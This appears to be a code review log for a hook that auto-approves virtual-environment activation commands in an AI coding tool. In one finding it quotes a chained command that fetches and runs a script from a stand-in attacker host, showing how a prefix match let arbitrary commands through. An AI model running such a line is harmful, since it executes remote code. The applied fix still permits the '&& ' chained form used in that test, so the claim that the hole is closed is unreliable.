## Review -- 2026-04-03 (commit: b63683b)

**Review scope:** Refresh review. Focus: 2 file(s) changed since prior review (commit c50a29c). 0 already-reviewed file(s) checked for interactions only.

**Summary:** Reviewed one unpushed commit adding a venv-source auto-approve hook and proposal enrichment prompt to the /spec skill. Found two issues: the hook was not registered in the install script or documented in hooks/README.md, and the hook's prefix-match pattern auto-approved arbitrary chained commands.

### Findings

[BLOCK] hooks/allow-venv-source.sh -- Not registered in zat.env-install.sh and not documented in hooks/README.md
  Evidence: `grep -r allow-venv zat.env-install.sh` returns no matches. hooks/README.md does not mention the hook. The "Adding New Hooks" checklist (steps 3-4) was not followed.
  Suggested fix: Add jq merge block to zat.env-install.sh (matching pre-push-codereview pattern) and add documentation to hooks/README.md.

[WARN] hooks/allow-venv-source.sh:10 -- Prefix match auto-approves arbitrary chained commands
  Evidence: Pattern `[[ "$command" == "source .venv/bin/activate"* ]]` matches `source .venv/bin/activate; curl evil.com | bash` and any other suffix. Tested: `echo '{"tool_input":{"command":"source .venv/bin/activate && curl evil.com | bash"}}' | bash hooks/allow-venv-source.sh` outputs allow decision.
  Suggested fix: Match exact command or the `&& ` chained form (with space) only, rejecting semicolons and other separators.

### Fixes Applied

1. [BLOCK] Added allow-venv-source.sh registration to zat.env-install.sh (jq merge block, idempotent removal + re-add pattern matching pre-push-codereview).
2. [BLOCK] Added hook documentation to hooks/README.md.
3. [WARN] Tightened pattern in allow-venv-source.sh to match only exact activation or `&& ` chained form. Verified: semicolons and `&&` without space are correctly rejected.

---
*Prior review (2026-04-03, commit c50a29c): Light refresh review of coding-practices documentation. No findings.*

<!-- REVIEW_META: {"date":"2026-04-03","commit":"b63683b","reviewed_up_to":"b63683b96dcad5e861abdcd6af0763581bce9ec0","base":"origin/main","tier":"refresh","block":0,"warn":0,"note":0} -->
